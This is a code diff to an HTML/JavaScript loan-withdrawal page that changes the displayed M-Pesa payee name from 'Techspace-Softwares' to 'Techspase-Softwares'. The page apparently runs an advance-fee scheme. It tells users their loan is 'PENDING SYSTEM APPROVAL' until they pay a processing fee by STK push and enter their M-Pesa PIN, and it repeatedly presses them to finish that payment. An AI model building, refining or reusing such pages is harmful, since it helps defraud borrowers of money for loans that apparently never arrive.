@@ -829,8 +829,8 @@
             </div>
             
             <h2 class="text-3xl font-bold mb-4">Processing Your Loan Withdrawal</h2>
-            <p class="text-xl mb-4" id="processingMessage">Initiating Techspace-Softwares STK Push...</p>
-            <p class="text-lg opacity-90 mb-6" id="processingSubMessage">Please check your phone  for the payment request from TECHSPACE-SOFTWARES</p>
+            <p class="text-xl mb-4" id="processingMessage">Initiating Techspase-Softwares STK Push...</p>
+            <p class="text-lg opacity-90 mb-6" id="processingSubMessage">Please check your phone  for the payment request from TECHSPASE-SOFTWARES</p>
             
             <!-- Trust indicators -->
             <div class="flex justify-center items-center space-x-6 mb-6">
@@ -1084,7 +1084,7 @@
                                     <div class="text-sm text-green-800">
                                         <p class="font-medium mb-1">M-Pesa Transfer Information:</p>
                                         <ul class="text-xs space-y-1">
-                                            <li>• You will receive an STK push notification from Techspace-Softwares for fee request.</li>
+                                            <li>• You will receive an STK push notification from Techspase-Softwares for fee request.</li>
                                             <li>• Funds will be credited instantly after confirmation</li>
                                             <li>• Transaction limit: KES 300,000 per day</li>
                                         </ul>
@@ -1530,7 +1530,7 @@
 
             const fee = document.getElementById("processingFee").textContent;
 
-const message = `Your withdrawal request is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from <span class="text-red-600 font-bold">✔️TECHSPACE-SOFTWARES✔️</span>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal. Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> after fee payment of <span class="font-bold text-green-700">${fee}</span> is confirmed.`;
+const message = `Your withdrawal request is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from <span class="text-red-600 font-bold">✔️TECHSPASE-SOFTWARES✔️</span>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal. Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> after fee payment of <span class="font-bold text-green-700">${fee}</span> is confirmed.`;
 
             // Update success message
             document.getElementById('successMessage').innerHTML = message;
@@ -1634,7 +1634,7 @@ startPendingProgress();}
             if (feePaymentInitiated === 'true') {
                 const withdrawalMethod = localStorage.getItem('swift_withdrawal_method') || 'M-Pesa';
                 showSuccess(
-                    `Complete previous withdrawal request sent to (${loanData.phone}) by clicking withdraw button  below if you didn't .STK Push was sent from TECHSPACE-SOFTWARES for the requested processing fee to complete the held funds or retry. Please complete the fee payment to process your ${withdrawalMethod} your withdrawal. Status: <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span>`
+                    `Complete previous withdrawal request sent to (${loanData.phone}) by clicking withdraw button  below if you didn't .STK Push was sent from TECHSPASE-SOFTWARES for the requested processing fee to complete the held funds or retry. Please complete the fee payment to process your ${withdrawalMethod} your withdrawal. Status: <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span>`
                 );
                 updateDisbursementTimeline(true);
             }
